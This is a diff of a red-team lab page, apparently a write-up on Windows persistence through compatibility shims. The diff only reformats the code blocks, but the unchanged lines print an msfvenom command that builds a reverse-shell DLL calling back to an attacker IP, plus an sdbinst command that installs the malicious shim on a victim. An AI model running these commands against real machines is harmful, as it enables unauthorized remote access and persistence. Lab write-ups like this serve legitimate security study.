@@ -10,13 +10,11 @@ In this lab, [Compatibility Administrator](https://www.microsoft.com/en-us/downl
 
 Generating malicious payload stored in a 32-bit DLL:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil32.dll
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Creating a shim fix for putty.exe - this is the "fix" that will get our malicious DLL injected into putty.exe when it is launched next time:
 
@@ -28,13 +26,11 @@ Creating a shim fix for putty.exe - this is the "fix" that will get our maliciou
 
 Installing the shim fixes database we created earlier onto the victim machine using a native windows utility:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 sdbinst.exe C:\experiments\mantvydas.sdb
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Launching putty.exe on the victim machine, sends us our reverse shell - DLL injection worked:
 
